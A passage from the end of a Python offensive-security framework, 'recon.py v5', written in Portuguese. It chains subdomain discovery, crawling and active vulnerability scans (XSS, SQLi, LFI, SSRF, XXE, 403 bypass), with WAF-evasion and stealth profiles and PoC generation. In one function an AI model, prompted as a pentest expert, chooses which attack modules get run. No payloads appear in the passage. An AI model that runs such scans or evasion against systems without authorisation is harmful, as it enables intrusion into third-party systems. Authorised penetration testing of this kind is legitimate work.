                            "enum": ["xss", "sqli", "lfi", "redirect", "nosql", "ssti",
                                     "ssrf", "xxe", "idor", "crlf", "host_injection",
                                     "graphql", "nuclei", "cors", "headers", "sensitive",
                                     "403bypass", "metadata", "cloud_recon"]
                        }
                    },
                    "rationale": {
                        "type": "string",
                        "description": "Justificativa técnica para os módulos escolhidos (1-2 frases)"
                    },
                    "skip_rationale": {
                        "type": "string",
                        "description": "Por que os demais módulos foram omitidos"
                    }
                },
                "required": ["modules", "rationale"]
            }
        }
    ]

    payload_data = {
        "model": "claude-sonnet-4-20250514",
        "max_tokens": 1000,
        "tools": tools,
        "tool_choice": {"type": "any"},
        "system": (
            "Você é um especialista em pentest. Analise os dados de reconhecimento "
            "e selecione os módulos de scan mais relevantes para o alvo. "
            "Priorize eficiência: menos módulos com maior chance de achado real. "
            "Responda usando a ferramenta run_scan_modules."
        ),
        "messages": [{"role": "user", "content": context}]
    }

    selected_modules = []
    try:
        req = urllib.request.Request(
            "https://api.anthropic.com/v1/messages",
            data=json.dumps(payload_data).encode(),
            headers={"Content-Type": "application/json",
                     "x-api-key": cfg.anthropic_api_key,
                     "anthropic-version": "2023-06-01"}
        )
        with urllib.request.urlopen(req, timeout=45) as resp:
            data = json.loads(resp.read())

        for block in data.get("content", []):
            if block.get("type") == "tool_use" and block.get("name") == "run_scan_modules":
                inp = block.get("input", {})
                selected_modules = inp.get("modules", [])
                rationale  = inp.get("rationale", "")
                skip_note  = inp.get("skip_rationale", "")
                info(f"Agente OODA — módulos selecionados: {selected_modules}")
                info(f"Justificativa: {rationale}")
                if skip_note:
                    info(f"Omitidos: {skip_note}")
                break

        if not selected_modules:
            warn("Agente não retornou módulos — executando pipeline padrão")
            return

        # Salva decisão
        agent_log = f"{cfg.dir_report}/agent_ooda.txt"
        with open(agent_log, 'w') as f:
            f.write(f"AGENTE OODA — {datetime.now().isoformat()}\n")
            f.write(f"Módulos: {selected_modules}\n")
            f.write(f"Justificativa: {rationale}\n")
            f.write(f"Omitidos: {skip_note}\n")
        success(f"Plano do agente salvo → {agent_log}")

        # ── Executa apenas os módulos escolhidos ──────────────────────────────
        module_map = {
            "xss":            step_xss,
            "sqli":           step_sqli,
            "lfi":            step_lfi,
            "redirect":       step_redirect,
            "nosql":          step_nosql,
            "ssti":           step_ssti_active,
            "ssrf":           step_ssrf_active,
            "xxe":            step_xxe,
            "idor":           step_idor,
            "crlf":           step_crlf,
            "host_injection": step_host_injection,
            "graphql":        step_graphql,
            "nuclei":         step_nuclei,
            "cors":           step_cors,
            "headers":        step_headers,
            "sensitive":      step_sensitive,
            "403bypass":      step_403_bypass,
            "metadata":       step_metadata,
            "cloud_recon":    step_cloud_recon,
        }
        for mod in selected_modules:
            fn = module_map.get(mod)
            if fn:
                fn()
                burst_sleep()
            else:
                warn(f"Módulo desconhecido: {mod}")

    except urllib.error.URLError as e:
        warn(f"Agente OODA falhou (rede): {e} — executando pipeline padrão")
    except (json.JSONDecodeError, KeyError) as e:
        warn(f"Agente OODA falhou (parse): {e} — executando pipeline padrão")
    except OSError as e:
        warn(f"Agente OODA falhou (OS): {e} — executando pipeline padrão")


# ─────────────────────────────────────────────────────────────────────────────
# v5 — PLAYWRIGHT CRAWL (SPAs — React, Vue, Angular)
# ─────────────────────────────────────────────────────────────────────────────
def step_playwright_crawl():
    """
    Navega nos hosts ativos com Playwright (headless Chromium), captura
    todas as requisições de rede (XHR/Fetch) e injeta endpoints descobertos
    diretamente em params_alive.txt para os scanners usarem.
    """
    section("02b / PLAYWRIGHT CRAWL (SPA — JS real)")

    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        warn("Playwright não instalado. Execute: pip install playwright && playwright install chromium")
        warn("  Pulando crawl de SPAs — URLs dinâmicas não serão capturadas.")
        return

    alive = safe_read(f"{cfg.dir_disc}/alive.txt")
    if not alive:
        warn("Sem hosts para crawl Playwright"); return

    targets = alive[:min(len(alive), 15)]  # limita para não exceder tempo
    captured: Set[str] = set()

    log(f"Playwright crawl em {len(targets)} hosts (headless Chromium)...")

    def crawl_host(url: str):
        host_urls: Set[str] = set()
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True, args=['--no-sandbox'])
                ctx = browser.new_context(
                    user_agent=random_ua(),
                    ignore_https_errors=True
                )
                page = ctx.new_page()

                def on_request(req):
                    rurl = req.url
                    if cfg.domain in rurl and ('?' in rurl or '/api/' in rurl.lower()):
                        host_urls.add(rurl)

                page.on("request", on_request)
                try:
                    page.goto(url, timeout=20000, wait_until="networkidle")
                    page.wait_for_timeout(3000)  # aguarda JS assíncrono
                    # Clica em links internos para disparar XHR
                    links = page.eval_on_selector_all(
                        'a[href]',
                        'els => els.map(e => e.href).filter(h => h.startsWith("http"))'
                    )
                    for link in links[:10]:
                        if cfg.domain in link:
                            try:
                                page.goto(link, timeout=10000, wait_until="domcontentloaded")
                                page.wait_for_timeout(1500)
                            except PWTimeout:
                                pass
                except PWTimeout:
                    log_err(f"playwright timeout: {url}")
                finally:
                    browser.close()
        except OSError as e:
            log_err(f"playwright OS error {url}: {e}")
        except Exception as e:
            log_err(f"playwright error {url}: {e}")
        return host_urls

    for target in targets:
        new_urls = crawl_host(target)
        captured.update(new_urls)
        if new_urls:
            info(f"  Playwright {target}: {len(new_urls)} URLs capturadas")
        jitter()

    if not captured:
        info("Playwright: nenhuma URL XHR/Fetch capturada"); return

    # Injeta em params_alive.txt para os scanners usarem
    params_alive = f"{cfg.dir_params}/params_alive.txt"
    pw_out = f"{cfg.dir_urls}/playwright_urls.txt"
    existing = set(safe_read(params_alive))
    new_params = sorted(u for u in captured if '?' in u and '=' in u and u not in existing)

    with open(pw_out, 'w') as f:
        f.write('\n'.join(sorted(captured)) + '\n')

    if new_params:
        with open(params_alive, 'a') as f:
            f.write('\n'.join(new_params) + '\n')
        success(f"Playwright: {len(captured)} URLs capturadas | {len(new_params)} novos params injetados → {params_alive}")
    else:
        success(f"Playwright: {len(captured)} URLs capturadas (sem novos params com parâmetros)")



def parse_args():
    parser = argparse.ArgumentParser(
        description="RECON.PY v5.0 — Full Automated Reconnaissance Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  python3 recon.py alvo.com
  python3 recon.py alvo.com --threads 200 --deep
  python3 recon.py alvo.com --api-key sk-ant-... --plan
  python3 recon.py alvo.com --stealth
  python3 recon.py alvo.com --watch --watch-interval 3600
  python3 recon.py --install
"""
    )
    parser.add_argument('domain', nargs='?', default='')
    parser.add_argument('--install',            action='store_true')
    parser.add_argument('--threads',            type=int, default=100)
    parser.add_argument('--deep',               action='store_true')
    parser.add_argument('--skip-scans',         action='store_true')
    parser.add_argument('--no-screenshots',     action='store_true')
    parser.add_argument('--verbose',            action='store_true')
    parser.add_argument('--api-key',            default='')
    parser.add_argument('--plan',               action='store_true', help='AI Attack Planner (requer --api-key)')
    parser.add_argument('--retry',              type=int, default=3)
    parser.add_argument('--jitter',             action='store_true')
    parser.add_argument('--no-waf-evasion',     action='store_true')
    parser.add_argument('--shodan-key',         default='')
    parser.add_argument('--no-adaptive',        action='store_true')
    parser.add_argument('--no-passive-intel',   action='store_true')
    parser.add_argument('--no-scoring',         action='store_true')
    parser.add_argument('--no-validate-secrets', action='store_true')
    parser.add_argument('--stealth',            action='store_true')
    parser.add_argument('--aggressive',         action='store_true')
    parser.add_argument('--timeout',            type=int, default=10)
    parser.add_argument('--curl-delay',         type=int, default=0)
    parser.add_argument('--xss-deadline',       type=int, default=45, help='Segundos por URL no XSS manual')
    parser.add_argument('--watch',              action='store_true', help='Modo watcher contínuo')
    parser.add_argument('--watch-interval',     type=int, default=3600)
    parser.add_argument('--sqlite-db',          default='', help='Caminho do banco SQLite persistente')
    parser.add_argument('--no-delta',           action='store_true')
    # Limits
    parser.add_argument('--limit-cors',         type=int, default=50)
    parser.add_argument('--limit-headers',      type=int, default=30)
    parser.add_argument('--limit-sensitive',    type=int, default=20)
    parser.add_argument('--limit-lfi',          type=int, default=30)
    parser.add_argument('--limit-redirect',     type=int, default=30)
    parser.add_argument('--limit-idor',         type=int, default=30)
    parser.add_argument('--limit-crlf',         type=int, default=30)
    parser.add_argument('--limit-waf',          type=int, default=20)
    parser.add_argument('--limit-403bypass',    type=int, default=30)
    parser.add_argument('--limit-metadata',     type=int, default=20)
    # v4: Segurança / ética
    parser.add_argument('--whitelist',          default='',
                        help='Domínios autorizados (separados por vírgula). Ex: alvo.com,staging.alvo.com')
    parser.add_argument('--dry-run',            action='store_true',
                        help='Simula o scan sem enviar requests reais')
    parser.add_argument('--encrypt-output',     action='store_true',
                        help='Criptografa outputs sensíveis com GPG (requer --encrypt-pass)')
    parser.add_argument('--encrypt-pass',       default='',
                        help='Senha para criptografia GPG dos outputs')
    # v4: Integrações
    parser.add_argument('--hibp-key',           default='',
                        help='HaveIBeenPwned API key para credential leak check')
    # v4: UX
    parser.add_argument('--live-dashboard',     action='store_true',
                        help='Inicia servidor local para dashboard em tempo real (porta 8765)')
    parser.add_argument('--dashboard-port',     type=int, default=8765)
    # v5: novos recursos
    parser.add_argument('--webhook-url',        default='',
                        help='URL de webhook para alertas (Discord/Slack/Telegram)')
    parser.add_argument('--agent',              action='store_true',
                        help='Modo agente OODA — IA decide quais módulos executar (requer API key)')
    parser.add_argument('--playwright',         action='store_true',
                        help='Crawl headless com Playwright para SPAs (React/Vue/Angular)')
    return parser.parse_args()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    # v5: carrega .env antes de qualquer coisa
    _load_dotenv()
    args = parse_args()
    cfg.scan_start = time.time()

    if args.install:
        banner()
        auto_install()
        sys.exit(0)

    if not args.domain:
        print(f"{RED}Erro: domínio não informado.{NC}")
        print(f"\n  {BOLD}Uso:{NC} python3 recon.py <dominio> [opções]")
        print(f"       python3 recon.py --install\n")
        sys.exit(1)

    # Apply config
    cfg.domain             = args.domain
    cfg.threads            = args.threads
    cfg.deep_mode          = args.deep
    cfg.skip_scans         = args.skip_scans
    cfg.skip_screenshots   = args.no_screenshots
    cfg.verbose            = args.verbose
    # v4: API key — prioriza variável de ambiente (mais seguro que flag)
    cfg.anthropic_api_key  = (
        os.environ.get('ANTHROPIC_API_KEY', '') or args.api_key
    )
    cfg.ai_plan_mode       = args.plan
    cfg.max_retries        = args.retry
    cfg.jitter_mode        = args.jitter
    cfg.waf_evasion        = not args.no_waf_evasion
    cfg.shodan_api_key     = args.shodan_key
    cfg.adaptive_mode      = not args.no_adaptive
    cfg.passive_intel      = not args.no_passive_intel
    cfg.endpoint_scoring   = not args.no_scoring
    cfg.validate_secrets   = not args.no_validate_secrets
    cfg.timeout            = args.timeout
    cfg.curl_delay         = args.curl_delay
    cfg.xss_url_deadline   = args.xss_deadline
    cfg.watcher_mode       = args.watch
    cfg.watch_interval     = args.watch_interval
    cfg.sqlite_db          = args.sqlite_db
    cfg.delta_mode         = not args.no_delta
    cfg.limit_cors         = args.limit_cors
    cfg.limit_headers      = args.limit_headers
    cfg.limit_sensitive    = args.limit_sensitive
    cfg.limit_lfi          = args.limit_lfi
    cfg.limit_redirect     = args.limit_redirect
    cfg.limit_idor         = args.limit_idor
    cfg.limit_crlf         = args.limit_crlf
    cfg.limit_waf          = args.limit_waf
    cfg.limit_403bypass    = args.limit_403bypass
    cfg.limit_metadata     = args.limit_metadata
    # v4 campos
    cfg.whitelist          = [d.strip() for d in args.whitelist.split(',') if d.strip()]
    cfg.dry_run            = args.dry_run
    cfg.encrypt_output     = args.encrypt_output
    cfg.encrypt_password   = args.encrypt_pass
    cfg.hibp_api_key       = args.hibp_key
    # v5
    cfg.webhook_url        = args.webhook_url or os.environ.get('RECON_WEBHOOK_URL', '')
    cfg.agent_mode         = args.agent
    cfg.playwright_mode    = args.playwright
    cfg.wordlist_path      = os.environ.get('RECON_WORDLIST', '')

    if args.stealth:
        cfg.scan_profile = "stealth"
        cfg.jitter_mode = True; cfg.waf_evasion = True; cfg.curl_delay = 2
        cfg.burst_pause = 5; cfg.max_dalfox_workers = 5; cfg.threads = 20
        cfg.gau_threads = 5; cfg.katana_depth = 2; cfg.xss_url_deadline = 30
        cfg.limit_cors = 10; cfg.limit_headers = 10; cfg.limit_sensitive = 5
        cfg.limit_lfi = 10; cfg.limit_redirect = 10; cfg.limit_idor = 10
        cfg.limit_crlf = 10; cfg.limit_xss_manual = 15; cfg.max_sqli = 10
    elif args.aggressive:
        cfg.scan_profile = "aggressive"
        cfg.threads = 200; cfg.gau_threads = 30; cfg.katana_depth = 6
        cfg.max_sqli = 100; cfg.limit_cors = 300; cfg.limit_headers = 200
        cfg.limit_sensitive = 200; cfg.limit_lfi = 200; cfg.limit_redirect = 200
        cfg.limit_idor = 100; cfg.limit_crlf = 100; cfg.limit_xss_manual = 300
        cfg.max_dalfox_workers = 50; cfg.xss_url_deadline = 60

    if cfg.deep_mode:
        cfg.katana_depth = 5; cfg.gau_threads = 20; cfg.max_sqli = 60
        cfg.limit_cors = 200; cfg.limit_headers = 100; cfg.limit_sensitive = 100
        cfg.limit_lfi = 100; cfg.limit_redirect = 100; cfg.limit_js_endpoints = 300
        cfg.limit_js_secrets = 200; cfg.limit_ffuf = 50; cfg.limit_arjun = 50
        cfg.limit_idor = 60; cfg.limit_crlf = 60; cfg.limit_xss_manual = 150
        cfg.limit_waf = 50; cfg.xss_url_deadline = 60

    # Watcher mode
    if cfg.watcher_mode:
        cfg.sqlite_db = cfg.sqlite_db or os.path.expanduser(f"~/.recon_{cfg.domain.replace('.','_')}.db")
        watcher_mode()
        return

    banner()
    setup_dirs()

    # v6: Health check inicial — valida binários, API, SQLite e wordlist antes de qualquer scan
    step_initial_health_check()

    # v4: Validação de whitelist (Safe Mode)
    validate_domain_whitelist()

    # v4: Aviso de dry-run
    if cfg.dry_run:
        print(f"\n  {BOLD}{YELLOW}⚠ DRY-RUN ATIVO — nenhum request será enviado ao alvo.{NC}")
        print(f"  {DIM}  Use este modo para validar configuração e alcance antes do scan real.{NC}\n")

    print(f"  {BOLD}Alvo      :{NC} {LCYAN}{cfg.domain}{NC}")
    print(f"  {BOLD}Threads   :{NC} {cfg.threads}")
    print(f"  {BOLD}Profile   :{NC} {cfg.scan_profile}")
    print(f"  {BOLD}Deep mode :{NC} {cfg.deep_mode}")
    print(f"  {BOLD}XSS limit :{NC} {cfg.xss_url_deadline}s/URL (v3 fix)")
    print(f"  {BOLD}AI Plan   :{NC} {'ativado' if cfg.ai_plan_mode else 'desativado (use --plan)'}")
    print(f"  {BOLD}AI Triage :{NC} {'ativado' if cfg.anthropic_api_key else 'desativado (use --api-key ou ANTHROPIC_API_KEY)'}")
    print(f"  {BOLD}SQLite    :{NC} {'ativado' if cfg.sqlite_db else 'desativado'}")
    print(f"  {BOLD}WAF Evasion:{NC} {'ativado' if cfg.waf_evasion else 'desativado'}")
    print(f"  {BOLD}Dry-run   :{NC} {'SIM ⚠' if cfg.dry_run else 'não'}")
    print(f"  {BOLD}Whitelist :{NC} {', '.join(cfg.whitelist) if cfg.whitelist else 'não configurada'}")
    print(f"  {BOLD}Encrypt   :{NC} {'ativado (GPG AES-256)' if cfg.encrypt_output else 'não'}")
    print(f"  {BOLD}HIBP      :{NC} {'ativado' if cfg.hibp_api_key else 'não (use --hibp-key)'}")
    print(f"  {BOLD}Pasta     :{NC} {CYAN}{cfg.scan_dir}{NC}")
    print()

    # Init SQLite
    if cfg.sqlite_db or cfg.delta_mode:
        cfg.sqlite_db = cfg.sqlite_db or os.path.expanduser(f"~/.recon_{cfg.domain.replace('.','_')}.db")
        db_init()
        _start_db_worker()   # v5: worker dedicado para INSERTs sem race condition

    # ── PIPELINE ──────────────────────────────────────────────────────────
    check_deps()
    step_subdomains()
    step_passive_intel()
    step_alive()
    # v5: crawl headless para SPAs antes do scan de params
    if cfg.playwright_mode:
        step_playwright_crawl()
    step_ports()
    step_screenshots()
    step_takeover()
    step_tech_profiler()          # v3: detecta stack antes dos scans
    step_cloud_recon()            # v4 NOVO: S3/GCS/Azure/K8s/Docker
    step_urls()
    step_filter_urls()
    step_waf_detect()
    adapt_to_waf()

    # v4: Live dashboard — inicia após diretórios configurados
    if hasattr(args, 'live_dashboard') and args.live_dashboard:
        start_live_dashboard(port=args.dashboard_port)

    if cfg.ai_plan_mode:
        step_ai_planner()

    if cfg.endpoint_scoring:
        info("🎯 Priorizando endpoints por score de risco...")
        for infile, outfile in [
            (f"{cfg.dir_params}/params_alive.txt", f"{cfg.dir_params}/params_alive_scored.txt"),
            (f"{cfg.dir_urls}/urls_clean.txt",     f"{cfg.dir_urls}/urls_clean_scored.txt"),
        ]:
            prioritize_targets(infile, outfile)
            if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
                shutil.copy(outfile, infile)

    step_js()
    step_params()
    step_gf()
    step_ffuf()
    step_403_bypass()
    step_cors()
    burst_sleep()
    step_headers()
    step_sensitive()
    step_metadata()

    if not cfg.skip_scans:
        if cfg.agent_mode and cfg.anthropic_api_key:
            # v5: OODA — IA decide os módulos e os executa internamente
            step_ai_agent()
        else:
            # Pipeline sequencial clássico
            step_xss();             burst_sleep()
            step_sqli();            burst_sleep()
            step_lfi()
            step_redirect()
            step_nosql();           burst_sleep()
            step_ssti_active()
            step_ssrf_active()
            step_xxe();             burst_sleep()
            step_idor()
            step_crlf()
            step_host_injection()
            step_graphql()
            step_nuclei()
            step_ai_triage()
    else:
        warn("Scans ativos pulados via --skip-scans")
        for fn in ['dalfox.txt','xss_manual.txt','xss_dom.txt','xss_headers.txt',
                   'sqli_confirmed.txt','sqli_error_based.txt','sqli_blind.txt',
                   'sqli_post.txt','lfi_results.txt','redirect_results.txt',
                   'ssti_results.txt','ssrf_results.txt','xxe_results.txt',
                   'nosql_results.txt','idor_results.txt','crlf_results.txt',
                   'host_injection_results.txt','graphql_results.txt',
                   'nuclei_all.txt','nuclei_critical.txt','nuclei_high.txt','nuclei_medium.txt']:
            Path(f"{cfg.dir_scans}/{fn}").touch()

    step_vuln_report()
    step_poc_generator()            # v4 NOVO: gera PoCs para vulns confirmadas
    step_credential_leak()          # v4 NOVO: HaveIBeenPwned
    step_executive_summary_ai()     # v4 NOVO: resumo executivo em linguagem não-técnica
    encrypt_output_files()          # v4 NOVO: criptografa outputs sensíveis
    if cfg.sqlite_db:
        _stop_db_worker()           # v5: aguarda fila SQLite esvaziar antes de sair
    final_summary()


if __name__ == "__main__":
    main()
